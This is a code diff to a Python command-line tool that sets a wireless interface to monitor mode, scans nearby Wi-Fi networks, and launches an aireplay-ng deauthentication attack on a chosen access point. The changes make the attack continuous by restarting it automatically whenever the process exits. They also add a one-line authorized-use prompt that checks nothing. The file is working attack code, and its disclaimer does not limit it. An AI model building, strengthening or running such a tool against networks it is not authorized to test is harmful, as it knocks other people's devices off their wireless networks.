@@ -4,9 +4,9 @@ import os
 import sys
 import time
 import subprocess
-import threading
+import signal
 import logging
-from typing import List, Dict, Optional
+from typing import Dict, Optional
 
 logging.basicConfig(level=logging.INFO, format="%(message)s")
 
@@ -27,33 +27,6 @@ def color_text(text: str, color: str) -> str:
 def style(text: str, *styles: str) -> str:
     prefix = "".join(s for s in styles if s)
     return f"{prefix}{text}{COLOR_RESET}" if prefix else text
-
-
-def freq_to_channel(freq: float) -> Optional[int]:
-    if 2412 <= freq <= 2472:
-        return int((freq - 2407) // 5)
-    if freq == 2484:
-        return 14
-    if 5000 <= freq <= 5825:
-        return int((freq - 5000) // 5)
-    return None
-
-
-def parse_channel_value(text: str) -> Optional[int]:
-    try:
-        return int(text)
-    except (TypeError, ValueError):
-        return None
-
-
-def parse_freq_value(text: str) -> Optional[float]:
-    try:
-        value = float(text)
-    except (TypeError, ValueError):
-        return None
-    if value > 100000:
-        value /= 1000.0
-    return value
 
 
 def get_interface_chipset(interface: str) -> str:
@@ -86,8 +59,8 @@ def get_interface_chipset(interface: str) -> str:
     return "unknown"
 
 
-def list_network_interfaces() -> List[str]:
-    interfaces: List[str] = []
+def list_network_interfaces() -> list:
+    interfaces = []
     ip_link = subprocess.run(["ip", "-o", "link", "show"], stdout=subprocess.PIPE, text=True, check=False)
     for line in ip_link.stdout.splitlines():
         if ": " in line:
@@ -140,48 +113,38 @@ def set_interface_type(interface: str, mode: str) -> bool:
         return False
 
 
-def is_interface_up(interface: str) -> bool:
-    result = subprocess.run(
-        ["ip", "-o", "link", "show", interface],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.DEVNULL,
-        text=True,
-        check=False,
-    )
-    if result.returncode != 0:
-        return False
-    line = result.stdout.strip()
-    return "state UP" in line or "state UNKNOWN" in line
+def parse_channel_value(text: str) -> Optional[int]:
+    try:
+        return int(text)
+    except (TypeError, ValueError):
+        return None
 
 
-def ensure_interface_up(interface: str) -> None:
-    if is_interface_up(interface):
-        return
-    subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
-    time.sleep(0.2)
+def parse_freq_value(text: str) -> Optional[float]:
+    try:
+        value = float(text)
+    except (TypeError, ValueError):
+        return None
+    if value > 100000:
+        value /= 1000.0
+    return value
 
 
-def set_channel(interface: str, channel: Optional[int]) -> bool:
-    if not channel:
-        return True
-    result = subprocess.run(
-        ["iw", "dev", interface, "set", "channel", str(channel)],
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.PIPE,
-        text=True,
-        check=False,
-    )
-    if result.returncode != 0:
-        logging.warning("Failed to set channel %s on %s: %s", channel, interface, result.stderr.strip() or "unknown error")
-        return False
-    return True
+def freq_to_channel(freq: float) -> Optional[int]:
+    if 2412 <= freq <= 2472:
+        return int((freq - 2407) // 5)
+    if freq == 2484:
+        return 14
+    if 5000 <= freq <= 5825:
+        return int((freq - 5000) // 5)
+    return None
 
 
 def scan_wireless_networks(
     interface: str,
     duration_seconds: int = 15,
     show_progress: bool = False,
-) -> List[Dict[str, Optional[str]]]:
+) -> list:
     def run_scan() -> subprocess.CompletedProcess:
         return subprocess.run(
             ["iw", "dev", interface, "scan"],
@@ -192,7 +155,7 @@ def scan_wireless_networks(
         )
 
     end_time = time.time() + max(1, duration_seconds)
-    networks: Dict[str, Dict[str, Optional[str]]] = {}
+    networks = {}
     last_remaining = None
     while time.time() < end_time:
         if show_progress and COLOR_ENABLED:
@@ -225,7 +188,7 @@ def scan_wireless_networks(
                 sys.stdout.write("\n")
             return []
 
-        current: Dict[str, Optional[str]] = {}
+        current = {"bssid": None, "ssid": None, "signal": None, "channel": None}
         for raw_line in result.stdout.splitlines():
             line = raw_line.strip()
             if line.startswith("BSS "):
@@ -319,7 +282,7 @@ def select_network(attack_interface: str, duration_seconds: int) -> Dict[str, Op
         logging.warning("Invalid selection. Try again.")
 
 
-def select_interface(interfaces: List[str]) -> str:
+def select_interface(interfaces: list, prompt_label: str) -> str:
     if not interfaces:
         logging.error("No network interfaces found.")
         sys.exit(1)
@@ -332,7 +295,7 @@ def select_interface(interfaces: List[str]) -> str:
         logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)
 
     while True:
-        choice = input(f"{style('Select attack interface', STYLE_BOLD)} (number or name): ").strip()
+        choice = input(f"{style(prompt_label, STYLE_BOLD)} (number or name): ").strip()
         if not choice:
             logging.warning("Please select an interface.")
             continue
@@ -345,17 +308,12 @@ def select_interface(interfaces: List[str]) -> str:
         logging.warning("Invalid selection. Try again.")
 
 
-ATTACK_PROCESS: Optional[subprocess.Popen] = None
-SELECTED_INTERFACE: Optional[str] = None
-ORIGINAL_MODE = "managed"
-
-
 def enable_monitor_mode(interface: str, channel: Optional[int]) -> bool:
     try:
         if not set_interface_type(interface, "monitor"):
             return False
-        ensure_interface_up(interface)
-        set_channel(interface, channel)
+        if channel:
+            subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stderr=subprocess.DEVNULL)
         if not is_monitor_mode(interface):
             current_mode = get_interface_mode(interface)
             logging.error(
@@ -377,7 +335,6 @@ def restore_managed_mode(interface: str) -> None:
         subprocess.run(["iw", "dev", interface, "set", "type", "managed"], check=False, stderr=subprocess.DEVNULL)
         subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
     except Exception:
-        # Best effort; don't raise during cleanup
         pass
 
 
@@ -389,12 +346,8 @@ def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> boo
         logging.error("Missing target BSSID; cannot start attack.")
         return False
 
-    if not is_monitor_mode(interface):
-        logging.warning("Interface is not in monitor mode; re-enabling.")
-        if not enable_monitor_mode(interface, channel):
-            return False
-    ensure_interface_up(interface)
-    set_channel(interface, channel)
+    if channel:
+        subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stderr=subprocess.DEVNULL)
 
     try:
         ATTACK_PROCESS = subprocess.Popen(
@@ -402,6 +355,7 @@ def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> boo
             stdout=subprocess.DEVNULL,
             stderr=subprocess.PIPE,
             text=True,
+            preexec_fn=os.setsid,
         )
     except FileNotFoundError:
         logging.error("Required tool 'aireplay-ng' not found!")
@@ -423,31 +377,80 @@ def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> boo
 def stop_attack() -> None:
     global ATTACK_PROCESS
     if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
-        ATTACK_PROCESS.terminate()
         try:
+            try:
+                pgid = os.getpgid(ATTACK_PROCESS.pid)
+            except Exception:
+                pgid = None
+            if pgid is not None:
+                try:
+                    os.killpg(pgid, signal.SIGTERM)
+                except Exception:
+                    ATTACK_PROCESS.terminate()
+            else:
+                ATTACK_PROCESS.terminate()
             ATTACK_PROCESS.wait(timeout=3)
         except subprocess.TimeoutExpired:
-            ATTACK_PROCESS.kill()
+            try:
+                if pgid is not None:
+                    os.killpg(pgid, signal.SIGKILL)
+                else:
+                    ATTACK_PROCESS.kill()
+            except Exception:
+                try:
+                    ATTACK_PROCESS.kill()
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        try:
+            for _ in range(5):
+                if ATTACK_PROCESS.poll() is not None:
+                    break
+                time.sleep(0.2)
+        except Exception:
+            pass
     ATTACK_PROCESS = None
 
 
 def cleanup():
     logging.info("Cleaning up...")
-    stop_attack()
-    if SELECTED_INTERFACE:
-        restore_managed_mode(SELECTED_INTERFACE)
+    try:
+        stop_attack()
+    except Exception:
+        pass
+
+    if ATTACK_INTERFACE:
+        try:
+            restore_managed_mode(ATTACK_INTERFACE)
+        except Exception:
+            pass
+
     logging.info("Cleanup completed")
 
 
-def run_deauth_session() -> bool:
-    global SELECTED_INTERFACE
+def disclaimer_confirmed(ssid: str, bssid: str) -> bool:
+    logging.info(style("Disclaimer:", STYLE_BOLD))
+    logging.info(
+        "This tool is intended for authorized testing only. "
+        "You must own the equipment and have explicit permission."
+    )
+    logging.info("Target SSID: %s (%s)", style(ssid, COLOR_SUCCESS, STYLE_BOLD), bssid)
+    choice = input(f"{style('Proceed', STYLE_BOLD)}? (Y/N): ").strip().lower()
+    return choice == "y"
 
+
+def run_deauth_session() -> bool:
+    global ATTACK_INTERFACE, ATTACK_PROCESS
+    
+    ATTACK_PROCESS = None
+    
     interfaces = list_network_interfaces()
-    SELECTED_INTERFACE = select_interface(interfaces)
+    ATTACK_INTERFACE = select_interface(interfaces, "Select attack interface")
 
     logging.info("")
-    input(f"{style('Press Enter', STYLE_BOLD)} to switch {SELECTED_INTERFACE} to monitor mode...")
-    if not enable_monitor_mode(SELECTED_INTERFACE, None):
+    input(f"{style('Press Enter', STYLE_BOLD)} to switch {ATTACK_INTERFACE} to monitor mode...")
+    if not enable_monitor_mode(ATTACK_INTERFACE, None):
         return False
 
     logging.info("")
@@ -466,8 +469,8 @@ def run_deauth_session() -> bool:
         scan_seconds = 1
 
     logging.info("")
-    input(f"{style('Press Enter', STYLE_BOLD)} to scan networks on {SELECTED_INTERFACE}...")
-    target_network = select_network(SELECTED_INTERFACE, scan_seconds)
+    input(f"{style('Press Enter', STYLE_BOLD)} to scan networks on {ATTACK_INTERFACE}...")
+    target_network = select_network(ATTACK_INTERFACE, scan_seconds)
     logging.info("")
     logging.info(
         "Target selected: %s (%s)",
@@ -475,26 +478,28 @@ def run_deauth_session() -> bool:
         target_network["bssid"],
     )
 
-    if not is_monitor_mode(SELECTED_INTERFACE):
+    logging.info("")
+    if not disclaimer_confirmed(target_network["ssid"] or "unknown", target_network["bssid"] or "unknown"):
+        logging.info(color_text("Aborted by user.", COLOR_STOP))
+        return False
+
+    if not is_monitor_mode(ATTACK_INTERFACE):
         logging.warning("Interface left monitor mode; re-enabling.")
-        if not enable_monitor_mode(SELECTED_INTERFACE, target_network.get("channel")):
+        if not enable_monitor_mode(ATTACK_INTERFACE, target_network.get("channel")):
             return False
-    else:
-        ensure_interface_up(SELECTED_INTERFACE)
-        set_channel(SELECTED_INTERFACE, target_network.get("channel"))
 
     logging.info("")
     input(
-        f"{style('Press Enter', STYLE_BOLD)} to start Deauth attack on "
+        f"{style('Press Enter', STYLE_BOLD)} to start Deauth Attack on "
         f"{style(target_network['ssid'], COLOR_SUCCESS, STYLE_BOLD)}..."
     )
 
-    if not start_deauth_attack(SELECTED_INTERFACE, target_network):
+    if not start_deauth_attack(ATTACK_INTERFACE, target_network):
         return False
 
     logging.info("")
     logging.info("=" * 50)
-    logging.info(f"Deauth attack is {style('running', COLOR_RUNNING, STYLE_BOLD)}!")
+    logging.info(f"Deauth Attack is {style('running', COLOR_RUNNING, STYLE_BOLD)}!")
     logging.info(f"Target: {style(target_network['ssid'], COLOR_SUCCESS, STYLE_BOLD)} ({target_network['bssid']})")
     logging.info("=" * 50)
     logging.info(
@@ -506,6 +511,7 @@ def run_deauth_session() -> bool:
     try:
         while True:
             time.sleep(1)
+            
             if ATTACK_PROCESS and ATTACK_PROCESS.poll() is not None:
                 err_output = ""
                 if ATTACK_PROCESS.stderr:
@@ -513,32 +519,24 @@ def run_deauth_session() -> bool:
                         err_output = ATTACK_PROCESS.stderr.read().strip()
                     except Exception:
                         err_output = ""
-                if err_output:
-                    logging.error("Deauth process exited unexpectedly: %s", err_output)
-                else:
-                    logging.error("Deauth process exited unexpectedly.")
-                return False
+                logging.warning("Deauth process exited unexpectedly: %s", err_output or "unknown error")
+                
+                time.sleep(2)
+                if not start_deauth_attack(ATTACK_INTERFACE, target_network):
+                    logging.error("Failed to restart deauth attack.")
+                    break
+                    
     except KeyboardInterrupt:
         logging.info(color_text("Stopping attack...", COLOR_STOP))
     finally:
-        stop_attack()
-        restore_managed_mode(SELECTED_INTERFACE)
+        cleanup()
 
-    logging.info("")
-    while True:
-        choice = input(
-            f"{style('Back to main menu', STYLE_BOLD)} (B) or {style('restart', STYLE_BOLD)} (R): "
-        ).strip().lower()
-        if choice in {"b", "back"}:
-            return False
-        if choice in {"r", "restart"}:
-            return True
-        logging.warning("Please enter B or R.")
+    return False
 
 
 def main():
-    logging.info(color_text("Deauth Wizard", COLOR_HEADER))
-    logging.info("Starting Deauth Attack System")
+    logging.info(color_text("Deauth Attack Tool", COLOR_HEADER))
+    logging.info("Continuous Deauthentication Attack")
     logging.info("")
 
     if os.geteuid() != 0:
@@ -554,11 +552,7 @@ def main():
     import atexit
     atexit.register(cleanup)
 
-    while True:
-        restart = run_deauth_session()
-        if not restart:
-            break
-        logging.info(color_text("Restarting deauth wizard...\n", COLOR_HEADER))
+    run_deauth_session()
 
 
 if __name__ == "__main__":
